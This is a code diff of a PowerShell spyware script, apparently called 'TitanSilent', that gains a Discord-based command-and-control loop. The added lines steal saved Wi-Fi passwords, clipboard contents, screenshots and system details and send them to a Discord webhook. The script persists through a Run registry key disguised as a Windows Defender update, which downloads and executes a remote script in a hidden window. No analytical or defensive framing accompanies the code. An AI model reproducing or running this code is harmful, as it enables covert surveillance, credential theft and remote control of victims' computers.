@@ -21,40 +21,65 @@ function Send-Screenshot {
     Remove-Item $file -Force
 }
 
-# Persistenz: Kopieren + Autostart
+function Listen-Discord {
+    while ($true) {
+        Start-Sleep -Seconds 10
+        $response = Invoke-RestMethod -Uri $webhook -Method Get
+        $latestMessage = $response[-1].content.ToLower()
+
+        switch ($latestMessage) {
+            "!screenshot" {
+                Send-Screenshot
+            }
+            "!info" {
+                Send-FullInfo
+            }
+            "!clipboard" {
+                $clip = Get-Clipboard
+                if ($clip -eq "") { $clip = "[Empty]" }
+                Send-Discord "📋 Clipboard: $clip"
+            }
+            "!wifi" {
+                Send-Wifi
+            }
+            "!exit" {
+                exit
+            }
+        }
+    }
+}
+
+function Send-Wifi {
+    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+    $wifi = ""
+    foreach ($p in $profiles) {
+        $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
+        $wifi += "`n$p → $pw"
+    }
+    Send-Discord "📡 WLANs:$wifi"
+}
+
+function Send-FullInfo {
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+    $uname = $env:USERNAME
+    $pc = $env:COMPUTERNAME
+    $os = (Get-CimInstance Win32_OperatingSystem).Caption
+    $av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct" | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue
+    if (!$av) { $av = "None Detected" }
+
+    $msg = "**[TitanSilent v6 – C2 Mode]**`n👤 User: $uname`n🖥️ PC: $pc`n💿 OS: $os`n🌐 IP: $ip`n🛡️ AV: $av"
+    Send-Discord $msg
+}
+
+# Persistenz
 $target = "$env:APPDATA\WindowsDefender.ps1"
 if (!(Test-Path $target)) {
     Copy-Item -Path $PSCommandPath -Destination $target -Force
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DefenderUpdate" /d "powershell -w hidden -ep bypass -c iex(iwr -UseBasicParsing 'https://raw.githubusercontent.com/titanxrio/ps1/main/v5.ps1')" /f
 }
 
-# IP
-$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+# Initial send
+Send-FullInfo
 
-# Systeminfo
-$uname = $env:USERNAME
-$pc = $env:COMPUTERNAME
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-$av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct" | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue
-if (!$av) { $av = "None Detected" }
-
-# WLAN
-$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
-$wifi = ""
-foreach ($p in $profiles) {
-    $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
-    $wifi += "`n$p → $pw"
-}
-
-# Clipboard
-$clip = Get-Clipboard
-if ($clip -eq "") { $clip = "[Empty]" }
-
-# Full Message
-$msg = "**[TitanSilent v5]**`n👤 User: $uname`n🖥️ PC: $pc`n💿 OS: $os`n🌐 IP: $ip`n🛡️ Antivirus: $av`n📡 **WLANs:**$wifi`n📋 **Clipboard:**`n$clip"
-Send-Discord $msg
-
-# Screenshot
-Send-Screenshot
-
-exit
+# Start listening for Discord Commands
+Listen-Discord
